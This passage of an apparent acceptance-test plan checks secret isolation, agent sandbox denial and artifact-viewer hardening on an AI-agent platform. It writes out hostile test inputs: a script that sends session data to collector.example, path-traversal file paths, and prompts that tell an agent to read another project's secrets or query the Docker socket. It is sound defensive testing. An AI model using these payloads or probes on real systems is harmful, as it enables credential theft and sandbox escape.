        grep -I SENTINEL-m3-9f4c2a1b $(git … for-each-ref --format='%(refname)') ; echo $?                # 1
C12h  # absent from worker logs:
      docker compose logs worker | grep -c SENTINEL-m3-9f4c2a1b                                            # 0
      docker compose logs api-a api-b | grep -c SENTINEL-m3-9f4c2a1b                                       # 0
C12i  # traversal rejected (property/fuzz, 12-test-strategy): mount relative_path attempts
      #   ../../etc/x, ../frontend/.env, /etc/x, .env.test.local/../../y, a symlinked parent dir,
      #   and a TRACKED target file; each → secret.materialization_failed with reason
      #   {path_escape,symlink_parent,tracked_target,absolute_path} and NO file created
C12j  # and the same sentinel asked for directly by the agent ("cat .env.test.local") → its tool
      #   output is a bounded preview that contains no sentinel; C12e re-run must stay 0
```

### Exit criterion — project A's agent cannot reach project B's workspace

```bash
X1  # declare B's workspace as A's denied path (profile field `sandbox_denied_paths` = [
    #   /workspaces/conversation/<B-conv>/repos/backend-b]), then in project A's conversation:
    prompt = "Read /workspaces/conversation/<B-conv>/repos/backend-b/.env.test.local and print it"
X2  observed: the agent's tool result carries `EACCES`/`Permission denied` and NO value; assert on the
    journal: no conversation.message.agent/tool.update payload contains SENTINEL-B-…
      psql -tAc "select count(*) from domain_events where project_id='<A>' and payload::text like '%SENTINEL-B-%'"  # 0
X3  sandbox-visible truth, same uid, same host, no grants: the identical path IS readable for
    project B's own conversation (positive control — otherwise X2 proves nothing)
X4  nono's own accounting, captured per turn:  sandbox.verified.payload.grants contains exactly the
    A paths and nothing under /workspaces/conversation/<B-conv>; af_unix_mediation="pathname";
    network_enforced=false on the agent-turn profile (reported, not hidden — ADR-0019 D3)
X4b  the socket probe, in the same launch: prompt "run curl --unix-socket /var/run/docker.sock
    http://localhost/version" → Permission denied / connection refused (SANDBOX.md C7 with
    #   our profile applied; GAP if the socket is absent in the container, and say so)
X5  and the *same* attempt with enforcement disabled as a permissive-dev labelled run MUST still deny
    the path (Landlock still applied) while carrying isolation="none": a labelled run is not an
    unlabelled one (05)
X6  cross-run within project A: run-1's worktree edit does not appear in run-2's (`git -C run-2 status
    --porcelain` empty) — case 17, WORKSPACES.md W2 re-proven with real agents and a real sandbox
X7  commit reach bounded (ADR-0017 P4 re-run inside the container): project A's agent commits on
    <scope-id>/backend successfully (workspace.committed with the post-commit ref read) and
    `git update-ref refs/heads/<B-run-id>/backend` from inside its sandbox fails with Permission denied
```

### Case 14 — APM lock digest is stable across a remote change

```bash
C14a  profile pins apm_package_ref=<fixture> + apm_lock_digest=sha256:…(per target, APM.md T5)
C14b  turn 1 runs; workspace.staged/sandbox.verified record the digest; install verified
C14c  MUTATE the upstream APM source: add a skill + bump its content (a real local-path change, and
      the git-source variant if the fixture can serve `git uploadpack` without credentials)
C14d  turn 2 on the SAME profile revision → `apm install --frozen` reproduces the SAME tree; assert
      sha256(apm.lock.yaml) on disk equals the recorded digest, and no new package content appears
C14e  and the refusal path: point the profile at a lockfile whose digest differs → the worker refuses
      to launch with a visible digest-mismatch failure rather than silently restaging (ADR-0008 D4)
```

### Case 15 — non-member probing everything, no metadata leak

```bash
C15a  carol (Project B only) as user `carol` via mock-oauth2-server, driving the LB:
C15b  GET /api/v1/projects/A{,/repos,/members,/secrets,/secret-mounts,/workspaces,/artifacts},
      GET /api/v1/secrets/{A's id}, …/materializations, GET /api/v1/workspaces/{A's},
      GET /api/v1/turns/{A's}/sandbox, GET /api/v1/artifacts/{A's}{,/content},
      POST /api/v1/artifacts/{A's}/preview-token, GET /projects/A/events (SSE, with a Last-Event-ID
      stolen from carol's own project), GET the preview URL from a token carol never minted
      → every one 404 application/problem+json; SSE never opens
C15c  psql -tAc "select action,outcome from audit_events where actor_id='<carol>' order by id"
      → every probe recorded outcome='denied'
C15d  body-equality check: carol's 404 bodies are byte-identical to a random-uuid 404 bodies
      (existence is project-scoped information, ADR-0014 §3)
C15e  and bob (Project A **viewer**) must NOT see restricted artifacts or any secret value: the
      sensitivity table (ADR-0020 D3) is enforced in SQL, proven by bob's 403/404 on /content
C15f  assistant search is **not** part of this case in M3 — there is no assistant surface yet
      (`11-build-roadmap.md` puts it in M7), so case 15 is reported as proven for API/SSE/artifact and
      **deferred** for assistant search, with the authz rule it must inherit already fixed here:
      assistant tools share the backend's authorization, and every search query carries the same
      project predicate as the routes above (D-023, `09`).
```

### Case 16 — HTML artifact with a script payload, in the sandboxed viewer

```bash
C16a  plant the artifact: the agent is prompted to write report.html containing
      <script>fetch('/api/v1/me',{credentials:'include'}).then(r=>r.text())
       .then(t=>fetch('https://collector.example/'+encodeURIComponent(t)));</script>
      plus <img src="http://localhost:18080/api/v1/me"> and a localStorage access attempt
C16b  publish it as an artifact; assert media_type=text/html, sensitivity=standard, artifact.created
C16c  server-side header checks:
      curl -sD- "http://localhost:18080/api/v1/artifacts/$ID/content" | head -8
        # Content-Type: text/plain; charset=utf-8, Content-Disposition: attachment
      curl -sD- "http://preview.localhost:18084/preview/$TOKEN" | head -12
        # Content-Security-Policy: sandbox; default-src 'none'; img-src data: blob:; …
        # X-Content-Type-Options: nosniff, Referrer-Policy: no-referrer, Cache-Control: no-store
C16d  origin isolation:
      curl -s "http://localhost:18084/preview/x"                     # 404 (app origin refuses)
      curl -s "http://preview.localhost:18084/api/v1/me" -H "Cookie: session=…"  # 404, and the
        # API access log line for this request shows NO Cookie header accepted
      docker compose logs api-a | grep 'GET /preview/' | grep -ci 'cookie'        # 0
C16e  token hygiene: expired token → 401 problem+json; token re-signed for another artifact id →
      refused; token used on the app origin → 404
C16f  Playwright leg below (W6)
```

### Case 17 — concurrent multi-repo run isolation

`X6` above plus: two conversations in project A each get a workspace on their own branch
(`workspace.prepared` payloads show distinct `run_ref`s and distinct `volume_id`s), the frontend repo
worktree is present in both from the same mirror, and edits made by conversation 1 (a real Claude
turn) are invisible to conversation 2 (`git -C …/run-2/repos/frontend status --porcelain` empty,
`git -C …/run-2/repos/frontend log --oneline -1` unchanged) while both are live concurrently — the
WORKSPACES.md W2 shape, but with agents running in parallel rather than sequentially.

### Playwright legs (`pnpm dlx @playwright/cli`, ADR-0006; screenshots stay in .playwright-cli/ and are never committed)

| id | steps | assertions |
|---|---|---|
| W1 | log in as alice → Project A → Settings → Secrets → create `test-database-url` via the masked input, choose `.env` destination, repository `backend`, path `.env.test.local`, lifecycle per-turn (J8) | the value never appears in the DOM (assert `page.content()` has no sentinel); no network frame's *response* contains it; path/permission policy and warnings rendered |
| W2 | open Project A → Repositories/Workspaces widget | repos, base refs, worktree identity, `volume_id`, dirty summary, excluded paths visible; **no absolute host path rendered** |
| W3 | start the turn, watch the project SSE stream | `workspace.prepared`, `secret.materialized`, `sandbox.verified` (or `sandbox.enforcement_failed` in the C13 run) appear live, metadata-only, with the sandbox verdict next to the conversation, not hidden in a tooltip (`10` J7's honesty rule) |
| W4 | Ops page → workers | sandbox backend/version/enforcement/verified rendered for worker-1, plus the pinned nono version; when `verified=false`, the page says so in words that do not imply safety |
| W5 | as carol, open `http://localhost:18080/projects/<A-id>` and `/artifacts`, and deep-link one of A's artifact URLs | 404/"not found" state, no project name, no artifact name, no spinner that later fills in; console has no leaked payload |
| W6 | as alice, open Project A → Artifacts → report.html preview | the preview iframe's `src` host is `preview.localhost:18084`; `page.evaluate` from the app context cannot read `iframe.contentDocument` (SecurityError); the collector request never appears in ANY network log; CDP `Network.getAllCookies` for the preview URL's jar is empty; `document.cookie` inside the preview frame is empty and `localStorage` throws |
| W7 | reload the app mid-turn (API replica roll) and reconnect the stream with `Last-Event-ID` | transcript continuity from M1/M2's mechanism still holds with the new event types in the stream (no gap, no unauthorized event) |
| W8 | kill the worker mid-turn (`docker kill`), restart on the same volume, then on a *different* volume | same-volume: workspace reclaimed (case 20 arm 1, `turn.interrupted` then a fresh turn reusing the workspace); different-volume: `workspace.recovery_lost` with `reason="volume_changed"` and the UI saying "prior edits lost, rerun required" — never "resumed" (J7) |

### Reporting

The M3 acceptance report pastes, per case: the command, the literal output, and the commit/ids it refers
to. `docs/compatibility/SANDBOX.md`, `APM.md`, `WORKSPACES.md` and `ACP.md` each gain the rows this
milestone actually observed — prefilled PASS is forbidden (AGENTS.md), and any row that stays GAP
(the GAP list: rootless Podman, the Landlock-missing kernel branch, enforced egress on a real model
turn, the worker image's own Landlock row until probed) is written as GAP with the reason.

## 7. Deviations this contract forces on the spec text

Each of these is caused by M0 evidence, not preference; the ADR that carries it is named.

| # | Spec text | What the evidence forced | ADR |
|---|---|---|---|
| D1 | `05`: workspace is `/var/lib/communication/workspaces/<run-id>/`, and a Run Workspace belongs to a run | M3 has runs and attempts in name only — `00003` created `conversation_turns`, and `attempts` is an M4 bullet. The workspace is scoped by `{conversation,run}` + uuid, with `run_id` left nullable and unpopulated until M4 | 0017 D1/D3 |
| D2 | `05`: `meta/` is "worker-only metadata, never mounted to agent" | git aborts outright when `HOME` is outside the grants (`warning: unable to access '~/.gitconfig': Permission denied` → `fatal: unknown error occurred while reading the configuration files`), and APM writes `~/.apm`. The agent needs a writable HOME **inside** its grants, so it is a sibling `home/` directory, and `meta/` keeps its promise literally | 0017 D1, 0019 D4 (evidence P6, APM.md T4) |
| D3 | `05`: "verify `git ls-files` and check ignore/exclude rules" (per-mount framing) | git ignores a per-worktree `info/exclude`, honors only the shared `<mirror>/info/exclude`, and `extensions.worktreeConfig` — the documented per-worktree route — broke every git command in that layout. Exclusions are therefore **project-scoped**, worker-written, agent-immutable | 0017 D6 (X1/X2/X3/X4) |
| D4 | `05`: a `SandboxPolicy` with `fs_deny` | nono has no CLI deny flag, and Linux `filesystem.deny` is point-in-time anyway; the adapter treats `FSDeny` under `required` as a configuration error and relies on absence-of-grant. Compounding it: `/tmp` is write-granted by nono's always-layered `default` profile, so omission is not a deny there | 0018 (threat model), 0019 D2/D5 (evidence N1/P9) |
| D5 | `05`/`12` case 13 imply one enforcement profile per run | a real Claude/Codex turn cannot answer at all with egress denied (the model API is the product), and domain allowlisting is a userland MITM proxy that was never proven end-to-end | 0019 D3 (two profiles, `network_enforced` reported per event; D-021 stays Provisional) |
| D6 | `05`: three credential kinds, harness auth may be "sensitive directory trees" | the lab's harness directories must stay **rw** mounts (mid-turn writes), so they cannot be per-attempt-isolated by the sandbox; two projects using one launcher share that state. Cross-project denial is proven over workspaces/mirrors, not credentials | 0019 D4 |
| D7 | `02`/`09`: artifact store with "S3-compatible production backend" | M3 ships the local shared-directory backend plus a *written* S3 contract; no S3 implementation and no MinIO service (a new dependency needs owner sign-off). D-014 stays Proposed | 0020 D7 |
| D8 | `09`'s `GET /artifacts/{id}` "signed controlled download" | signing is implemented as an HMAC'd token minted by the API for **both** backends, and preview is a separate **hostname** (not a port, not a path) because cookies are host-scoped | 0020 D5/D6 |
| D9 | `05`: `lifecycle: node_attempt` | the only unit that exists in M3 is the turn; `node_attempt` is accepted by the CHECK and honoured by nothing | 0018 D1 |
| D10 | `04`: `AgentProfileRevision` with `sandbox_policy_ref`, `secret_refs`, `limits`… | there are still no profile revisions (ADR-0016 deferred them), so M3 adds columns to `agent_profiles`; `limits` (resources/CPU/memory) is **not** implemented and is named as unimplemented rather than modeled as a no-op | 0017/0019 (§ 1 columns), 0019 Verification |
| D11 | `05`: "linked worktree or clone", D-008 per-run worktree default | confirmed workable, but the admin directory name is not derivable from the layout (git auto-suffixes `backend`, `backend1`) and git needs reflog directories pre-created; the contract therefore *reads* these paths back instead of constructing them | 0017 D4 (P1/P7) |
| D12 | `12-test-strategy.md` case 16 rendered "in restricted sandboxed viewer" | an `allow-scripts`-less iframe already makes the payload inert, which is a different guarantee than "the script runs but is contained"; M3 proves both the inert case and the direct-navigation case, and self-contained HTML only | 0020 D6 |

## 8. Open questions for the project owner

Only the two categories the brief names (production identity/IdP, Accepted-decision deviations, money):

1. **Harness credential custody (blocks a `required` claim, and touches D-010/D-020's
   Accepted "organization-managed, terms-compliant" wording).** `04` requires
   organization-managed, terms-compliant harness auth and warns that personal interactive CLI
   subscriptions may not permit shared service usage. M3 as designed proves everything except that
   sentence: it runs on the lab owner's personal Claude login mounted rw into one worker
   (`compose.harness.yml`, authorized for local development only). Deciding *whose* credentials a
   production worker may hold — org API key per project, a broker, or a per-attempt copy — changes
   Decision 4 of ADR-0019 and cannot be resolved by an implementation worker, because it is a
   licensing/terms question, not a technical one.
2. **Is there a budget for one paid artifact/storage integration?** ADR-0020 D7 pins an
   S3-compatible contract with no implementation, which keeps D-014 **Proposed** and means M3's
   artifact store is single-host. Running its conformance suite needs either an owner-provided bucket
   (real money, however small) or a MinIO service added to the lab stack (a new runtime dependency,
   which AGENTS.md makes an owner call rather than an implementation convenience). Everything else in
   this contract was decided here.
